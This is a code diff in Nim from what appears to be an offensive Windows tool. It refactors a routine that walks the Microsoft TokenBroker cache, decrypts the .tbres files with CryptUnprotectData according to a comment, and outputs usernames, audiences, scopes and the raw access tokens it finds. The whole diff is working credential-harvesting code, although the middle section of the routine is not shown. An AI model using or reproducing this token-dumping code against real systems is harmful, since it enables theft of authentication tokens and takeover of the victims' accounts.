@@ -9,20 +9,20 @@ proc readTBRESStr(stream: Stream): string =
   var length = swapInt32Endian(stream.readInt32())
   return stream.readStr(length)
 
-proc runTBRES*() : void =
+proc runTBRES*() : string =
+  result.add makeSectionTitle("TokenBroker Cache")
   var cache_path = getHomeDir() / "Appdata/Local/Microsoft/TokenBroker/Cache"
 
   # If doesn't exist, return
   if not dirExists(cache_path):
-    echo "TokenBroker cache not found"
+    result.add "TokenBroker cache not found" & "\n"
     return
 
   # Get all files in cache and decrypt them using CryptUnprotectData
   var files = toSeq(walkFiles(cache_path & "\\*.tbres"))
-  echo $files.len
   for file in files:
     var tbres = try: readFile(file)
-                except: echo "Could not read " & file; continue # Skip if can't read file
+                except: result.add "Could not read " & file & "\n"; continue # Skip if can't read file
 
     var cleaned_json = multiReplace(tbres, ("\x00", ""))
     var json = parseJson(cleaned_json)
@@ -50,9 +50,10 @@ proc runTBRES*() : void =
       var isValid = token_json["exp"].getInt() > getTime().toUnix
       var valid_Str = if isValid: green("True") else: "False"
 
-      echo ("Found: " & file).green
-      echo "\tUsername: " & username
-      echo "\tAudience: " & WELL_KNOWN_APPIDS.getOrDefault(audience, audience)
-      echo "\tScopes: " & token_json["scp"].getStr()
-      echo "\tValid: " & valid_Str
-      echo "\tToken: " & token & "\n"
+      result.add ("Found: " & file).green & "\n"
+      result.add "\tUsername: " & username & "\n"
+      result.add "\tAudience: " & WELL_KNOWN_APPIDS.getOrDefault(audience, audience) & "\n"
+      result.add "\tScopes: " & token_json["scp"].getStr() & "\n"
+      result.add "\tValid: " & valid_Str & "\n"
+      result.add "\tToken: " & token & "\n"
+  return result
